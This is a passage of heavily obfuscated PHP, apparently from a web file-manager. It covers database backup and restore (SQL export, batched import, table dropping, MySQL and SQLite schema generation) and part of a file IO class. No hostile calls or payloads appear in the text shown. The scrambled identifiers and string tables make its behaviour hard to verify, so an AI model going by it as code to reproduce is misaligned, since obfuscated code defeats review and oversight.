$àˆöŠñ = $this->sqlToDb($¾ªÎÌ¸“, $ªÂï¶¸‹); if (!$àˆöŠñ) { ActionCall($¶§‡Â§¦[1082], !0, 0); show_json(LNG($¶§‡Â§¦[1087]) . "\x5b{$¸Óºí‘Í}\135", !1); } } } public function sqlFromDb($Ø§¨†Â², $æ¡³²íÅ, &$ôÂ± ª”, $¢ ûğÆ = '') { if ($ôÂ± ª”) { $ôÂ± ª”->task[$_SERVER[ä¿÷‹µ±][1086]] = $Ø§¨†Â²; } $€«Œş = $this->model($Ø§¨†Â²); $á³Ãåóì = 0; $›ŒË±é = 0; $´”ÚÌı = 10000; $Óï«·áó = fopen($æ¡³²íÅ, $_SERVER[ä¿÷‹µ±][1088]); $¡çı±Ä = $€«Œş->getPk(); $æØáüéë = $€«Œş->getDbFields(); $¥‡·áíÃ = $_SERVER[ä¿÷‹µ±][12]; if ($GLOBALS[$_SERVER[ä¿÷‹µ±][806]] && in_array($Ø§¨†Â², array($_SERVER[ä¿÷‹µ±][1089], $_SERVER[ä¿÷‹µ±][1090]))) { $¥‡·áíÃ = $Ø§¨†Â²; } do { $¡½÷½©Ô = array($¡çı±Ä => array($_SERVER[ä¿÷‹µ±][1036], $›ŒË±é)); $¢÷´™ÊŒ = $€«Œş->where($¡½÷½©Ô)->field($æØáüéë)->order($¡çı±Ä . $_SERVER[ä¿÷‹µ±][1091])->limit($´”ÚÌı)->select(); $¢÷´™ÊŒ = !empty($¢÷´™ÊŒ) ? $¢÷´™ÊŒ : array(); if (!($ªÇâ½Ìø = count($¢÷´™ÊŒ))) { break; } $Ï±İ ‚§ = end($¢÷´™ÊŒ); $›ŒË±é = $Ï±İ ‚§[$¡çı±Ä]; $ç˜ñ•ìñ = array(); foreach ($¢÷´™ÊŒ as $¨÷Îë¼×) { if ($¥‡·áíÃ) { if ($Ø§¨†Â² == $_SERVER[ä¿÷‹µ±][1089]) { if ($¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][33]] == $_SERVER[ä¿÷‹µ±][1092]) { $åô“¦è = json_decode($¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][374]], !0); if ($åô“¦è[$_SERVER[ä¿÷‹µ±][32]] == $GLOBALS[$_SERVER[ä¿÷‹µ±][806]] && $åô“¦è[$_SERVER[ä¿÷‹µ±][769]] != 1) { continue; } } } else { if ($¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][33]] == $_SERVER[ä¿÷‹µ±][1093] && $¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][94]] == $_SERVER[ä¿÷‹µ±][798]) { continue; } } } if ($¢ ûğÆ) { $¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][84]] = "\173\151\157\72{$¢ ûğÆ}\x7d" . substr($¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][84]], strlen("\x7b\x69\157\72{$¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][836]]}\x7d")); $¨÷Îë¼×[$_SERVER[ä¿÷‹µ±][836]] = $¢ ûğÆ; } $ç˜ñ•ìñ[] = $_SERVER[ä¿÷‹µ±][1094] . $this->sqlEncode($¨÷Îë¼×) . $_SERVER[ä¿÷‹µ±][1095]; } $£•ÛÊÛ = "\111\x4e\123\105\122\x54\40\x49\116\x54\117\40\x60{$Ø§¨†Â²}\x60\40\x28\x60" . implode($_SERVER[ä¿÷‹µ±][1096], $æØáüéë) . $_SERVER[ä¿÷‹µ±][1097]; fwrite($Óï«·áó, $£•ÛÊÛ . implode($_SERVER[ä¿÷‹µ±][1098], $ç˜ñ•ìñ) . $_SERVER[ä¿÷‹µ±][71] . PHP_EOL); $á³Ãåóì += $ªÇâ½Ìø; if ($ôÂ± ª”) { $ôÂ± ª”->update($ªÇâ½Ìø); } } while ($´”ÚÌı == $ªÇâ½Ìø); fclose($Óï«·áó); return $á³Ãåóì; } public function sqlToDb($¨–ù£, &$¡ğ¼ŞĞ) { $ôò¾£“Ù =& $_SERVER[ä¿÷‹µ±]; $³‡ïÄº¤ = $this->model()->db(); $Î½ÇÊÌö = @fopen($¨–ù£, $ôò¾£“Ù[1099]); if (!$Î½ÇÊÌö) { return !1; } $•Óóà–ì = 0; $²³ìæÊ = $ôò¾£“Ù[12]; $ÕûñØ¯ç = array(); $úÉ®®² = $this->dbType(); $çÃüÉ£ª = $úÉ®®² == $ôò¾£“Ù[13] ? 500 : 2000; $Šº©¾×æ = basename($¨–ù£, $ôò¾£“Ù[807]); $ç›ïƒò = 0; $œ…öÍ±Ï = 4194304 - 104858; $ùÒ‰âÊ½ = 1000000 - 104858; while (!feof($Î½ÇÊÌö)) { $³ïİÁı = trim(fgets($Î½ÇÊÌö)); if (!$³ïİÁı) { continue; } $ÜÓ³ƒ² = $this->sqlDecode($³ïİÁı, $úÉ®®², $Šº©¾×æ); if (stripos($ÜÓ³ƒ², $ôò¾£“Ù[355]) === 0) { if (!$²³ìæÊ) { $²³ìæÊ = $ÜÓ³ƒ² . $ôò¾£“Ù[53]; } continue; } if ($¡ğ¼ŞĞ) { $¡ğ¼ŞĞ->task[$ôò¾£“Ù[805]] += 1; } $•Óóà–ì++; $ÕûñØ¯ç[] = rtrim(rtrim(trim($ÜÓ³ƒ²), $ôò¾£“Ù[50]), $ôò¾£“Ù[71]); $Î™˜Ğª = null; $¸–Óìœå = strlen($ÜÓ³ƒ²); $ç›ïƒò += $¸–Óìœå; if ($ç›ïƒò >= ($çÃüÉ£ª == 500 ? $ùÒ‰âÊ½ : $œ…öÍ±Ï)) { $Î™˜Ğª = array_pop($ÕûñØ¯ç); if ($•Óóà–ì > 1) { $•Óóà–ì--; } } if ($•Óóà–ì >= $çÃüÉ£ª || $Î™˜Ğª) { $ÜÓ³ƒ² = $²³ìæÊ . implode($ôò¾£“Ù[50], $ÕûñØ¯ç); if (!$³‡ïÄº¤->execute($ÜÓ³ƒ²)) { return !1; } if ($¡ğ¼ŞĞ) { $¡ğ¼ŞĞ->update($•Óóà–ì); } $ÕûñØ¯ç = array(); $•Óóà–ì = 0; $ç›ïƒò = 0; if ($Î™˜Ğª) { $ÕûñØ¯ç = array($Î™˜Ğª); $•Óóà–ì = 1; $ç›ïƒò = $¸–Óìœå; } } } fclose($Î½ÇÊÌö); if (!empty($ÕûñØ¯ç)) { $ÜÓ³ƒ² = $²³ìæÊ . implode($ôò¾£“Ù[50], $ÕûñØ¯ç); if (!$³‡ïÄº¤->execute($ÜÓ³ƒ²)) { return !1; } if ($¡ğ¼ŞĞ) { $¡ğ¼ŞĞ->update($•Óóà–ì); } } return !0; } public function dropTable($‘ı¶ôû˜ = null) { $ö®¾ò÷÷ = $this->model()->db(); $µƒÄ¯×¼ = $‘ı¶ôû˜ ? array($‘ı¶ôû˜) : $ö®¾ò÷÷->getTables(); if (!$µƒÄ¯×¼) { return; } foreach ($µƒÄ¯×¼ as $‘ı¶ôû˜) { if ($‘ı¶ôû˜) { $‘ı¶ôû˜ = strtolower($‘ı¶ôû˜); } else { continue; } $ö®¾ò÷÷->execute("\144\162\x6f\160\x20\164\x61\142\154\x65\40\x69\x66\40\x65\170\x69\163\164\163\40\x60{$‘ı¶ôû˜}\140"); } } private function sqlEncode($·ø¯úÜá) { $Èòî°İÓ =& $_SERVER[ä¿÷‹µ±]; $ñÄç­£ = array(); foreach ($·ø¯úÜá as $ëÜåˆ³ü) { if (is_array($ëÜåˆ³ü)) { $ëÜåˆ³ü = json_encode_force($ëÜåˆ³ü); } $ëÜåˆ³ü = addslashes($ëÜåˆ³ü); $ëÜåˆ³ü = str_replace(array($Èòî°İÓ[1100], $Èòî°İÓ[231]), array($Èòî°İÓ[1101], $Èòî°İÓ[1102]), $ëÜåˆ³ü); $ñÄç­£[] = str_replace($Èòî°İÓ[58], $Èòî°İÓ[1103], $ëÜåˆ³ü); } return $Èòî°İÓ[58] . implode($Èòî°İÓ[1104], $ñÄç­£) . $Èòî°İÓ[58]; } private function sqlDecode($­Õà‚ì‘, $ì¿ÒÅÃ¹, $Ó…¸´ã½ = '') { $¹¸ú„Ü =& $_SERVER[ä¿÷‹µ±]; $­Õà‚ì‘ = str_replace(array($¹¸ú„Ü[1101], $¹¸ú„Ü[1102]), array($¹¸ú„Ü[1100], $¹¸ú„Ü[231]), $­Õà‚ì‘); if ($ì¿ÒÅÃ¹ == $¹¸ú„Ü[13]) { return $Ó…¸´ã½ != $¹¸ú„Ü[1105] ? stripslashes($­Õà‚ì‘) : $­Õà‚ì‘; } if ($Ó…¸´ã½ == $¹¸ú„Ü[1105]) { $­Õà‚ì‘ = str_replace($¹¸ú„Ü[1106], $¹¸ú„Ü[118], stripslashes($­Õà‚ì‘)); } return $­Õà‚ì‘; } public function getSqlFile($Ù¢ĞÉ‹ø = '') { $Ç¶¡áø² =& $_SERVER[ä¿÷‹µ±]; $ğ³—¾‡ = $this->dbType(!0); $…Ìû³‚´ = CONTROLLER_DIR . "\x69\x6e\163\164\141\154\x6c\57\144\x61\x74\141\57{$ğ³—¾‡}\x2e\163\x71\x6c"; $¾éƒÅŠí = file_get_contents($…Ìû³‚´); $¾„£Ç²° = $Ç¶¡áø²[1107] . ($ğ³—¾‡ == $Ç¶¡áø²[823] ? $Ç¶¡áø²[1108] : $Ç¶¡áø²[1109]) . $Ç¶¡áø²[1110]; preg_match_all($¾„£Ç²°, $¾éƒÅŠí, $„œ™­‹ë); $Îñªæø = $„œ™­‹ë[1]; $—ˆ°úÇ = $this->model()->db(); $²èÒÜ€ = $—ˆ°úÇ->getTables(); $×êóëê˜ = TEMP_FILES . $Ç¶¡áø²[1111] . date($Ç¶¡áø²[770]) . $Ç¶¡áø²[8]; del_dir($×êóëê˜); mk_dir($×êóëê˜); $³µÍƒ¬Ì = $×êóëê˜ . $Ç¶¡áø²[1112]; $ÄÅ‚“˜ğ = $×êóëê˜ . $Ç¶¡áø²[1113]; $•ó‡Ä÷Ä = $ğ³—¾‡ == $Ç¶¡áø²[13] ? $Ç¶¡áø²[823] : $Ç¶¡áø²[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\x61\x6c\x6c\57\144\141\164\141\57{$•ó‡Ä÷Ä}\56\x73\x71\x6c", $×êóëê˜); @touch($×êóëê˜ . $ğ³—¾‡ . $Ç¶¡áø²[807]); $¼„¿¯Ñ = fopen($³µÍƒ¬Ì, $Ç¶¡áø²[1088]); $™’®­áˆ = fopen($ÄÅ‚“˜ğ, $Ç¶¡áø²[1088]); if ($ğ³—¾‡ == $Ç¶¡áø²[13]) { $²èÒÜ€ = array_diff($²èÒÜ€, array($Ç¶¡áø²[803], $Ç¶¡áø²[804])); $¸Ş²× ¨ = array($Ç¶¡áø²[1114], $Ç¶¡áø²[1115], $Ç¶¡áø²[1116]); fwrite($™’®­áˆ, implode(PHP_EOL, $¸Ş²× ¨) . PHP_EOL . PHP_EOL); foreach ($²èÒÜ€ as $Œ¢¹‚á¤) { $ÂşäºŸ = $this->sqlFromSqlite($Œ¢¹‚á¤); if (!$ÂşäºŸ[$Ç¶¡áø²[13]]) { continue; } fwrite($™’®­áˆ, $ÂşäºŸ[$Ç¶¡áø²[13]] . PHP_EOL . PHP_EOL); if (!in_array($Œ¢¹‚á¤, $Îñªæø)) { fwrite($¼„¿¯Ñ, $ÂşäºŸ[$Ç¶¡áø²[823]] . PHP_EOL . PHP_EOL); } } } else { foreach ($²èÒÜ€ as $Œ¢¹‚á¤) { $ÂşäºŸ = $this->sqlFromMysql($Œ¢¹‚á¤); if (!$ÂşäºŸ[$Ç¶¡áø²[823]]) { continue; } fwrite($¼„¿¯Ñ, $ÂşäºŸ[$Ç¶¡áø²[823]] . PHP_EOL . PHP_EOL); if (!in_array($Œ¢¹‚á¤, $Îñªæø)) { fwrite($™’®­áˆ, $ÂşäºŸ[$Ç¶¡áø²[13]] . PHP_EOL . PHP_EOL); } } } fclose($¼„¿¯Ñ); fclose($™’®­áˆ); $¾éƒÅŠí = array($Ç¶¡áø²[823] => $³µÍƒ¬Ì, $Ç¶¡áø²[13] => $ÄÅ‚“˜ğ); return $Ù¢ĞÉ‹ø ? $¾éƒÅŠí[$Ù¢ĞÉ‹ø] : $¾éƒÅŠí; } public function dbType($¬—¸úÓ = false) { $¬ó«”ö =& $_SERVER[ä¿÷‹µ±]; $»óñÙƒè = $¬—¸úÓ ? $GLOBALS[$¬ó«”ö[6]][$¬ó«”ö[21]] : $this->database; $»óñÙƒè = array_change_key_case($»óñÙƒè); $ƒôÇŞò = $»óñÙƒè[$¬ó«”ö[989]]; if ($ƒôÇŞò == $¬ó«”ö[986]) { $°÷ë…›Í = explode($¬ó«”ö[4], $»óñÙƒè[$¬ó«”ö[995]]); $ƒôÇŞò = $°÷ë…›Í[0]; } $ŸŠ†Œî = array($¬ó«”ö[1117] => $¬ó«”ö[13], $¬ó«”ö[932] => $¬ó«”ö[823]); if (isset($ŸŠ†Œî[$ƒôÇŞò])) { $ƒôÇŞò = $ŸŠ†Œî[$ƒôÇŞò]; } return $ƒôÇŞò; } public function sqlFromMysql($½¹Ô¦‘¨, $¡Ó¥Íìß = '') { $ô§ßÃßÜ =& $_SERVER[ä¿÷‹µ±]; $ùÅ€üØº = $this->model()->db(); $Øó»„ì = $ùÅ€üØº->query($ô§ßÃßÜ[1118] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[385]); if (!$Øó»„ì || !$Øó»„ì[0]) { return !1; } $ÏÑ€ç§ş = _get($Øó»„ì[0], $ô§ßÃßÜ[1119], $ô§ßÃßÜ[12]); if (!$ÏÑ€ç§ş) { return !1; } $Û§Ó¾ıŒ = "\x44\x52\117\120\40\124\101\x42\114\x45\40\x49\x46\40\105\130\111\123\x54\123\x20\x60{$½¹Ô¦‘¨}\140\x3b" . PHP_EOL . $ÏÑ€ç§ş . $ô§ßÃßÜ[71]; if ($¡Ó¥Íìß && $¡Ó¥Íìß == $ô§ßÃßÜ[823]) { return $Û§Ó¾ıŒ; } $ÊôéÒë° = array_change_key_case($GLOBALS[$ô§ßÃßÜ[6]][$ô§ßÃßÜ[21]]); $ı¯”—ƒ = $ÊôéÒë°[$ô§ßÃßÜ[994]]; $½Ó×—…á = $ô§ßÃßÜ[1120] . $ı¯”—ƒ . $ô§ßÃßÜ[1121] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[58]; $éóîò‘À = $ô§ßÃßÜ[1122] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[920]; $¥Ï“Ì’É = $ùÅ€üØº->query($½Ó×—…á); if (empty($¥Ï“Ì’É)) { $ÉªÖÆˆ¨ = array($ô§ßÃßÜ[823] => $ô§ßÃßÜ[12], $ô§ßÃßÜ[13] => $ô§ßÃßÜ[12]); return $¡Ó¥Íìß ? $ÉªÖÆˆ¨[$¡Ó¥Íìß] : $ÉªÖÆˆ¨; } $Ë¨Ã‹‚ë = $ùÅ€üØº->query($éóîò‘À); $†·•ÖƒË = $ô§ßÃßÜ[12]; $‹ú½Æ‚› = array(); foreach ($Ë¨Ã‹‚ë as $›ø³—âº) { if (!$†·•ÖƒË && $›ø³—âº[$ô§ßÃßÜ[1123]] == $ô§ßÃßÜ[1124]) { $†·•ÖƒË = $›ø³—âº[$ô§ßÃßÜ[1125]]; } if (isset($‹ú½Æ‚›[$›ø³—âº[$ô§ßÃßÜ[1123]]])) { $‹ú½Æ‚›[$›ø³—âº[$ô§ßÃßÜ[1123]]][$ô§ßÃßÜ[1126]][] = $›ø³—âº[$ô§ßÃßÜ[1125]]; continue; } $‹ú½Æ‚›[$›ø³—âº[$ô§ßÃßÜ[1123]]] = array($ô§ßÃßÜ[1127] => $›ø³—âº[$ô§ßÃßÜ[1123]], $ô§ßÃßÜ[1126] => array($›ø³—âº[$ô§ßÃßÜ[1125]]), $ô§ßÃßÜ[1128] => $›ø³—âº[$ô§ßÃßÜ[1129]] == $ô§ßÃßÜ[88] ? 0 : 1); } $¬ªíå×© = array(); foreach ($‹ú½Æ‚› as $›ø³—âº) { $ªª¡Ù‹º = $›ø³—âº[$ô§ßÃßÜ[1127]] == $ô§ßÃßÜ[1124]; $¬©šêåÆ = array($ô§ßÃßÜ[1130], $›ø³—âº[$ô§ßÃßÜ[1128]] == $ô§ßÃßÜ[88] && !$ªª¡Ù‹º ? $ô§ßÃßÜ[1131] : $ô§ßÃßÜ[12], $ô§ßÃßÜ[1132], $ô§ßÃßÜ[1133] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[11] . ($ªª¡Ù‹º ? $ô§ßÃßÜ[1134] : $›ø³—âº[$ô§ßÃßÜ[1127]]) . $ô§ßÃßÜ[118], $ô§ßÃßÜ[1135], $ô§ßÃßÜ[118] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[118], $ô§ßÃßÜ[1136] . implode($ô§ßÃßÜ[1137], $›ø³—âº[$ô§ßÃßÜ[1126]]) . $ô§ßÃßÜ[1138]); $¬ªíå×©[] = implode($ô§ßÃßÜ[53], $¬©šêåÆ) . $ô§ßÃßÜ[71]; } $¿¬ç‘§ = array(); $•÷òÈ—Ë = array($ô§ßÃßÜ[1139] => $ô§ßÃßÜ[1140], $ô§ßÃßÜ[1140] => $ô§ßÃßÜ[1140], $ô§ßÃßÜ[288] => $ô§ßÃßÜ[315], $ô§ßÃßÜ[287] => $ô§ßÃßÜ[315]); foreach ($¥Ï“Ì’É as $›ø³—âº) { $¬©šêåÆ = array($ô§ßÃßÜ[118] . $›ø³—âº[$ô§ßÃßÜ[1141]] . $ô§ßÃßÜ[118], isset($•÷òÈ—Ë[$›ø³—âº[$ô§ßÃßÜ[1142]]]) ? $•÷òÈ—Ë[$›ø³—âº[$ô§ßÃßÜ[1142]]] : $›ø³—âº[$ô§ßÃßÜ[1143]], $›ø³—âº[$ô§ßÃßÜ[1144]] == $ô§ßÃßÜ[918] ? $ô§ßÃßÜ[1145] : $ô§ßÃßÜ[1146], $›ø³—âº[$ô§ßÃßÜ[1141]] == $†·•ÖƒË ? $ô§ßÃßÜ[1147] : $ô§ßÃßÜ[12], $›ø³—âº[$ô§ßÃßÜ[971]] ? strtoupper(str_replace($ô§ßÃßÜ[11], $ô§ßÃßÜ[12], $›ø³—âº[$ô§ßÃßÜ[971]])) : $ô§ßÃßÜ[12]); $¿¬ç‘§[] = trim(implode($ô§ßÃßÜ[53], $¬©šêåÆ)); } $÷ôì¦ö÷ = array($ô§ßÃßÜ[1148] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[1149], $ô§ßÃßÜ[1150] . $½¹Ô¦‘¨ . $ô§ßÃßÜ[1151], implode($ô§ßÃßÜ[50] . PHP_EOL, $¿¬ç‘§), $ô§ßÃßÜ[968]); $×ß¼…Ú = implode(PHP_EOL, array_merge($÷ôì¦ö÷, $¬ªíå×©)); if ($¡Ó¥Íìß && $¡Ó¥Íìß == $ô§ßÃßÜ[13]) { return $×ß¼…Ú; } $ÉªÖÆˆ¨ = array($ô§ßÃßÜ[823] => $Û§Ó¾ıŒ, $ô§ßÃßÜ[13] => $×ß¼…Ú); return $¡Ó¥Íìß ? $ÉªÖÆˆ¨[$¡Ó¥Íìß] : $ÉªÖÆˆ¨; } public function sqlFromSqlite($ƒí¤ıßô, $ë–Í´Õ¾ = '') { $Ÿ°ÈÃ–ã =& $_SERVER[ä¿÷‹µ±]; $­›İÛß = $this->model()->db(); $ÖÚ‹Ù«à = "\120\x52\x41\107\x4d\x41\x20\124\x41\x42\114\105\x5f\x49\116\106\117\40\x28\x27{$ƒí¤ıßô}\x27\x29"; $Èä¶ªŞ€ = "\x53\x45\114\x45\x43\124\40\x2a\x20\x46\x52\x4f\115\x20\163\x71\x6c\151\x74\x65\137\x6d\141\x73\x74\145\x72\40\x57\110\x45\122\105\x20\x74\142\x6c\x5f\x6e\x61\155\145\40\x3d\40\47{$ƒí¤ıßô}\47"; $é¢™€ = $­›İÛß->query($ÖÚ‹Ù«à); if (empty($é¢™€)) { $åûäò­¶ = array($Ÿ°ÈÃ–ã[823] => $Ÿ°ÈÃ–ã[12], $Ÿ°ÈÃ–ã[13] => $Ÿ°ÈÃ–ã[12]); return $ë–Í´Õ¾ ? $åûäò­¶[$ë–Í´Õ¾] : $åûäò­¶; } $¿´“ç°™ = $­›İÛß->query($Èä¶ªŞ€); $ñ¼Áï°æ = $„ÛÅñù¾ = array(); foreach ($¿´“ç°™ as $¶Œ¦Ö´) { if ($¶Œ¦Ö´[$Ÿ°ÈÃ–ã[33]] == $Ÿ°ÈÃ–ã[279]) { $ñ¼Áï°æ[] = $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[1152]]; } else { $„ÛÅñù¾[$¶Œ¦Ö´[$Ÿ°ÈÃ–ã[32]]] = $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[1152]]; } } $ğúÔŠ¾ = array_merge(array($Ÿ°ÈÃ–ã[1148] . $ƒí¤ıßô . $Ÿ°ÈÃ–ã[118]), $ñ¼Áï°æ, array_values($„ÛÅñù¾)); $ğúÔŠ¾ = implode($Ÿ°ÈÃ–ã[71] . PHP_EOL, $ğúÔŠ¾) . $Ÿ°ÈÃ–ã[71]; if ($ë–Í´Õ¾ && $ë–Í´Õ¾ == $Ÿ°ÈÃ–ã[13]) { return $ğúÔŠ¾; } $‹àÖ˜é¶ = array(); $ã‘ı¡™Ş = array($Ÿ°ÈÃ–ã[1140] => $Ÿ°ÈÃ–ã[1153], $Ÿ°ÈÃ–ã[315] => $Ÿ°ÈÃ–ã[1154]); $ÚéÉèù¤ = $Ÿ°ÈÃ–ã[12]; foreach ($é¢™€ as $¶Œ¦Ö´) { if ($¶Œ¦Ö´[$Ÿ°ÈÃ–ã[57]] == $Ÿ°ÈÃ–ã[88]) { $ÚéÉèù¤ = $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[32]]; } $ãâ¥üü = array($Ÿ°ÈÃ–ã[385] . $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[32]] . $Ÿ°ÈÃ–ã[385], isset($ã‘ı¡™Ş[$¶Œ¦Ö´[$Ÿ°ÈÃ–ã[33]]]) ? $ã‘ı¡™Ş[$¶Œ¦Ö´[$Ÿ°ÈÃ–ã[33]]] : $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[33]], $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[35]] == $Ÿ°ÈÃ–ã[88] ? $Ÿ°ÈÃ–ã[1145] : $Ÿ°ÈÃ–ã[1155] . $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[56]], $¶Œ¦Ö´[$Ÿ°ÈÃ–ã[57]] == $Ÿ°ÈÃ–ã[88] ? $Ÿ°ÈÃ–ã[1156] : $Ÿ°ÈÃ–ã[12]); $‹àÖ˜é¶[] = trim(implode($Ÿ°ÈÃ–ã[53], $ãâ¥üü)); } foreach ($„ÛÅñù¾ as $ò¯ŸıÀ¦ => $ö¬¶õò) { $Ùô°É‡­ = str_replace($Ÿ°ÈÃ–ã[1157] . $ƒí¤ıßô . $Ÿ°ÈÃ–ã[11], $Ÿ°ÈÃ–ã[12], $ò¯ŸıÀ¦); $Öéş„á = str_replace(array($Ÿ°ÈÃ–ã[118], $Ÿ°ÈÃ–ã[979]), $Ÿ°ÈÃ–ã[385], substr($ö¬¶õò, stripos($ö¬¶õò, $Ÿ°ÈÃ–ã[260]))); if ($Ùô°É‡­ == $Ÿ°ÈÃ–ã[1134]) { $í‹ø™Èé = $Ÿ°ÈÃ–ã[1158] . $ÚéÉèù¤ . $Ÿ°ÈÃ–ã[1159]; } else { $í‹ø™Èé = (stripos($Ùô°É‡­, $Ÿ°ÈÃ–ã[11]) ? $Ÿ°ÈÃ–ã[1160] : $Ÿ°ÈÃ–ã[12]) . ($Ÿ°ÈÃ–ã[1161] . $Ùô°É‡­ . $Ÿ°ÈÃ–ã[1162] . $Öéş„á); } $‹àÖ˜é¶[] = $í‹ø™Èé; } $íÇÈšÈ = array($Ÿ°ÈÃ–ã[1163] . $ƒí¤ıßô . $Ÿ°ÈÃ–ã[1164], $Ÿ°ÈÃ–ã[1165] . $ƒí¤ıßô . $Ÿ°ÈÃ–ã[1166], implode($Ÿ°ÈÃ–ã[50] . PHP_EOL, $‹àÖ˜é¶), $Ÿ°ÈÃ–ã[1167]); $ ¸““¹ = implode(PHP_EOL, $íÇÈšÈ); if ($ë–Í´Õ¾ && $ë–Í´Õ¾ == $Ÿ°ÈÃ–ã[823]) { return $ ¸““¹; } $åûäò­¶ = array($Ÿ°ÈÃ–ã[823] => $ ¸““¹, $Ÿ°ÈÃ–ã[13] => $ğúÔŠ¾); return $ë–Í´Õ¾ ? $åûäò­¶[$ë–Í´Õ¾] : $åûäò­¶; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($›—Ä€ô¿, $®Èğ¯) { $ö¦ÊóØ£ =& $_SERVER[ä¿÷‹µ±]; $õË£š“ = $®Èğ¯; $GLOBALS[$ö¦ÊóØ£[1168]] = $ö¦ÊóØ£[1169] . $›—Ä€ô¿; Hook::trigger($ö¦ÊóØ£[1169] . $›—Ä€ô¿ . $ö¦ÊóØ£[1170], $õË£š“); $ÚçÌÑÄö = self::driverMake($®Èğ¯[0]); if (!$ÚçÌÑÄö) { return !1; } if (method_exists($ÚçÌÑÄö, $›—Ä€ô¿)) { $»±÷Ãõ± = @call_user_func_array(array($ÚçÌÑÄö, $›—Ä€ô¿), $®Èğ¯); } else { if (method_exists($ÚçÌÑÄö, $ö¦ÊóØ£[1171])) { $»±÷Ãõ± = @call_user_func_array(array($ÚçÌÑÄö, $›—Ä€ô¿), $®Èğ¯); } else { if (method_exists(self, $›—Ä€ô¿)) { $»±÷Ãõ± = @call_user_func_array(array(self, $›—Ä€ô¿), $®Èğ¯); } else { $»±÷Ãõ± = call_user_func_array(array(parent, $›—Ä€ô¿), $®Èğ¯); } } } Hook::trigger($ö¦ÊóØ£[1169] . $›—Ä€ô¿ . $ö¦ÊóØ£[1172], $õË£š“, $»±÷Ãõ±); return $»±÷Ãõ±; } public static function init($ŞÛ¦ŞÕ) { return self::driverMake($ŞÛ¦ŞÕ); } public static function copy($ñåôÓÆ, $Á¢ÔÄÚ°, $Ø…©¢Ò· = false, $â¯šèàê = false) { return self::copyMoveStart($ñåôÓÆ, $Á¢ÔÄÚ°, $Ø…©¢Ò·, $_SERVER[ä¿÷‹µ±][555], $â¯šèàê); } public static function move($“üÍ„ş, $Áò·Ú¦³, $æÚ°µå = false, $Ç— • = false) { return self::copyMoveStart($“üÍ„ş, $Áò·Ú¦³, $æÚ°µå, $_SERVER[ä¿÷‹µ±][557], $Ç— •); } private static function copyMoveStart($ŞàáÔ•, $Ÿ÷Á”óÃ, $æ™ÍøŠÒ, $ú„Ç­, $­ÌğµÑ¹) { $ˆ€ï®— =& $_SERVER[ä¿÷‹µ±]; $÷ı·ùÊì = array($ŞàáÔ•, $Ÿ÷Á”óÃ, $æ™ÍøŠÒ, $­ÌğµÑ¹); Hook::trigger($ˆ€ï®—[1169] . $ú„Ç­ . $ˆ€ï®—[1170], $÷ı·ùÊì); $¬§Í¸ª¿ = self::copyMove($ŞàáÔ•, $Ÿ÷Á”óÃ, $æ™ÍøŠÒ, $ú„Ç­, $­ÌğµÑ¹); Hook::trigger($ˆ€ï®—[1169] . $ú„Ç­ . $ˆ€ï®—[1172], $÷ı·ùÊì, $¬§Í¸ª¿); return $¬§Í¸ª¿; } public static function saveFile($ã‹ù¿¿é, $âòÉ©–, $ãô“ô×ß = true) { $¾«ıİ‘Ô =& $_SERVER[ä¿÷‹µ±]; $‘ª‚õ™Å = self::info($âòÉ©–); $‹í™ÆÇ… = self::driverMake($ã‹ù¿¿é); $—„‹óÎ = self::driverMake($âòÉ©–); $·Ïë½ëú = !1; if ($—„‹óÎ->pathParse[$¾«ıİ‘Ô[1173]]) { $·Ïë½ëú = $—„‹óÎ; $É¤¿É·Ö = $—„‹óÎ->pathParse[$¾«ıİ‘Ô[1173]]; $—„‹óÎ = self::driverMake($É¤¿É·Ö); } if ($‹í™ÆÇ…->pathParse[$¾«ıİ‘Ô[1173]]) { $‰âÖİ§ë = $‹í™ÆÇ…->pathParse[$¾«ıİ‘Ô[1173]]; $‹í™ÆÇ… = self::driverMake($‰âÖİ§ë); } $¥ï¦¥Ç˜ = $—„‹óÎ->pathFather($âòÉ©–); $»®Ô¢Û× = !0; if (!$ãô“ô×ß && self::driverIsSame($‹í™ÆÇ…, $—„‹óÎ)) { $»®Ô¢Û× = !1; } $­‰ ”·Ù = self::copyFile($‹í™ÆÇ…, $ã‹ù¿¿é, $—„‹óÎ, $¥ï¦¥Ç˜, $‘ª‚õ™Å[$¾«ıİ‘Ô[32]], $»®Ô¢Û×); if ($·Ïë½ëú) { $­‰ ”·Ù = $·Ïë½ëú->getPathOuter($­‰ ”·Ù); } return $­‰ ”·Ù; } private static function copyMove($Ã¯”í«, $ş¾ë¡À, $àì“©Š¹, $éì¦¾Ôğ, $ÕÊƒ¯Ñ = false) { $Ì¸ÇßÅó =& $_SERVER[ä¿÷‹µ±]; if (!$Ã¯”í« || $Ã¯”í« == $Ì¸ÇßÅó[8] || !$ş¾ë¡À) { return !1; } ignore_timeout(); $ÌğÍ© = self::driverMake($Ã¯”í«); $±î‡«ğ÷ = self::driverMake($ş¾ë¡À); $ŒÊÀß£İ = $éì¦¾Ôğ == $Ì¸ÇßÅó[557]; $åÎ´•Œ¬ = !1; if ($±î‡«ğ÷->pathParse[$Ì¸ÇßÅó[1173]]) { $åÎ´•Œ¬ = $±î‡«ğ÷; $ş¾ë¡À = $±î‡«ğ÷->pathParse[$Ì¸ÇßÅó[1173]]; $±î‡«ğ÷ = self::driverMake($ş¾ë¡À); } if ($ÌğÍ©->pathParse[$Ì¸ÇßÅó[1173]]) { $Ã¯”í« = 